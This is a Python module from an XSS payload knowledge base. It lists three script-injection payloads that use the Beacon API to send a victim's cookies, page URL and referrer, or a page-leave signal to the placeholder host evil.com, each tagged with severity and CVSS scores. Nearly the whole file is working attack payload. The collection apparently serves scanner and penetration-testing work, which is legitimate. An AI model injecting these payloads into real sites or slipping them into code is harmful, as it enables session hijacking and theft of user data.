#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Beacon API XSS Payloads
"""

from ..models import PayloadEntry


BEACON_PAYLOADS = {
    "beacon_1": PayloadEntry(
        payload="<script>navigator.sendBeacon('//evil.com/log',document.cookie)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Beacon API cookie exfil",
        tags=["beacon", "cookie", "exfil"],
        reliability="high",
    ),
    "beacon_2": PayloadEntry(
        payload="<script>navigator.sendBeacon('//evil.com/log',JSON.stringify({url:location.href,ref:document.referrer}))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="Beacon API context exfil",
        tags=["beacon", "context", "exfil"],
        reliability="high",
    ),
    "beacon_3": PayloadEntry(
        payload="<script>window.onbeforeunload=()=>navigator.sendBeacon('//evil.com/log','leaving')</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Beacon on page leave",
        tags=["beacon", "unload"],
        reliability="high",
    ),
}

BEACON_PAYLOADS_TOTAL = len(BEACON_PAYLOADS)
